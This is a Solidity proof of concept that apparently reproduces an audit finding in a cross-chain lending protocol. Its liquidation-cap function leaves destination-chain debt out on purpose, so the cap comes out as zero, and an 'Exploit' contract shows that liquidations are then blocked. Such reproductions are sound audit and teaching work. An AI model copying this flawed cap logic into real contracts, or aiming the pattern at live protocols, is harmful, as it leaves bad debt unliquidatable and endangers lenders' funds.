// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

/*  LEND — cross-chain liquidations blocked by a zero maxLiquidatable
    (Sherlock 2025-05, H-8, finding 58377).
    SYNTHETIC, cheatcode-free. getMaxLiquidationRepayAmount and
    borrowWithInterest keep the audited branches. The @> line is the
    cross-chain arm that ignores destination-chain debt. */

interface LTokenInterface {
    function borrowIndex() external view returns (uint256);
}

interface LendtrollerInterfaceV2 {
    function closeFactorMantissa() external view returns (uint256);
}

contract LToken is LTokenInterface {
    uint256 public index = 1e18;

    function borrowIndex() external view returns (uint256) {
        return index;
    }
}

contract Lendtroller is LendtrollerInterfaceV2 {
    function closeFactorMantissa() external pure returns (uint256) {
        return 0.5e18;
    }
}

contract LendStorage {
    struct Borrow {
        uint256 srcEid;
        uint256 destEid;
        uint256 principle;
        uint256 borrowIndex;
        address borrowedlToken;
        address srcToken;
    }

    address public lendtroller;
    uint256 public currentEid;

    mapping(address => address) public lTokenToUnderlying;
    mapping(address => mapping(address => Borrow[])) public crossChainBorrows;
    mapping(address => mapping(address => Borrow[])) public crossChainCollaterals;

    constructor(address _lendtroller, uint256 _currentEid) {
        lendtroller = _lendtroller;
        currentEid = _currentEid;
    }

    function setUnderlying(address _lToken, address _token) external {
        lTokenToUnderlying[_lToken] = _token;
    }

    function addCrossChainCollateral(address borrower, address _token, Borrow memory b) external {
        crossChainCollaterals[borrower][_token].push(b);
    }

    function borrowWithInterest(address borrower, address _lToken) public view returns (uint256) {
        address _token = lTokenToUnderlying[_lToken];
        uint256 borrowedAmount;

        Borrow[] memory borrows = crossChainBorrows[borrower][_token];
        Borrow[] memory collaterals = crossChainCollaterals[borrower][_token];

        require(borrows.length == 0 || collaterals.length == 0, "Invariant violated: both mappings populated");
        if (borrows.length > 0) {
            for (uint256 i = 0; i < borrows.length; i++) {
                if (borrows[i].srcEid == currentEid) {
                    borrowedAmount +=
                        (borrows[i].principle * LTokenInterface(_lToken).borrowIndex()) / borrows[i].borrowIndex;
                }
            }
        } else {
            for (uint256 i = 0; i < collaterals.length; i++) {
                if (collaterals[i].destEid == currentEid && collaterals[i].srcEid == currentEid) {
                    borrowedAmount +=
                        (collaterals[i].principle * LTokenInterface(_lToken).borrowIndex()) / collaterals[i].borrowIndex;
                }
            }
        }
        return borrowedAmount;
    }

    function borrowWithInterestSame(address, address) public pure returns (uint256) {
        return 0;
    }

    function getMaxLiquidationRepayAmount(address borrower, address lToken, bool isSameChain)
        external
        view
        returns (uint256)
    {
        uint256 currentBorrow = 0;

        currentBorrow += isSameChain ? borrowWithInterestSame(borrower, lToken) : borrowWithInterest(borrower, lToken); // @> VULN: destination-chain borrows are absent from borrowWithInterest, so the cap is 0

        uint256 closeFactorMantissa = LendtrollerInterfaceV2(lendtroller).closeFactorMantissa();
        uint256 maxRepay = (currentBorrow * closeFactorMantissa) / 1e18;
        return maxRepay;
    }

    /// @dev Counts borrows whose destination is this chain. Not called by run().
    function maxRepayCountingDestination(address borrower, address lToken) external view returns (uint256) {
        address _token = lTokenToUnderlying[lToken];
        Borrow[] memory collaterals = crossChainCollaterals[borrower][_token];
        uint256 borrowedAmount;
        for (uint256 i = 0; i < collaterals.length; i++) {
            if (collaterals[i].destEid == currentEid) {
                borrowedAmount +=
                    (collaterals[i].principle * LTokenInterface(lToken).borrowIndex()) / collaterals[i].borrowIndex;
            }
        }
        uint256 closeFactorMantissa = LendtrollerInterfaceV2(lendtroller).closeFactorMantissa();
        return (borrowedAmount * closeFactorMantissa) / 1e18;
    }
}

contract CrossChainRouter {
    LendStorage public lendStorage;

    constructor(LendStorage _lendStorage) {
        lendStorage = _lendStorage;
    }

    function validateLiquidation(address borrower, address borrowedlToken, uint256 repayAmount) external view {
        uint256 maxLiquidationAmount = lendStorage.getMaxLiquidationRepayAmount(borrower, borrowedlToken, false);
        require(repayAmount <= maxLiquidationAmount, "Exceeds max liquidation");
    }
}

contract Exploit {
    LToken public lToken;
    Lendtroller public lendtroller;
    LendStorage public vuln;
    CrossChainRouter public router;

    address public borrower = address(0xB0110);
    address internal token = address(0xDEAD);

    uint256 internal constant THIS_EID = 2;
    uint256 internal constant SRC_EID = 1;
    uint256 public constant DEBT = 1000e18;
    uint256 public constant REPAY = 500e18;

    uint256 public realDebt;
    uint256 public maxRepay;
    bool public liquidationBlocked;
    uint256 public collateralStillSeizable;

    constructor() {
        lToken = new LToken();
        lendtroller = new Lendtroller();
        vuln = new LendStorage(address(lendtroller), THIS_EID);
        router = new CrossChainRouter(vuln);
        vuln.setUnderlying(address(lToken), token);
    }

    function run() external {
        realDebt = DEBT;
        collateralStillSeizable = DEBT;

        vuln.addCrossChainCollateral(
            borrower,
            token,
            LendStorage.Borrow({
                srcEid: SRC_EID,
                destEid: THIS_EID,
                principle: DEBT,
                borrowIndex: 1e18,
                borrowedlToken: address(lToken),
                srcToken: token
            })
        );

        maxRepay = vuln.getMaxLiquidationRepayAmount(borrower, address(lToken), false);

        (bool ok,) = address(router).staticcall(
            abi.encodeWithSelector(router.validateLiquidation.selector, borrower, address(lToken), REPAY)
        );
        liquidationBlocked = !ok;

        require(realDebt == DEBT, "debt missing");
        require(maxRepay == 0, "cap not zero");
        require(liquidationBlocked, "liquidation was not blocked");
        require(collateralStillSeizable == DEBT, "collateral marked seized");
        require(REPAY > maxRepay, "repay was inside the cap");
    }
}
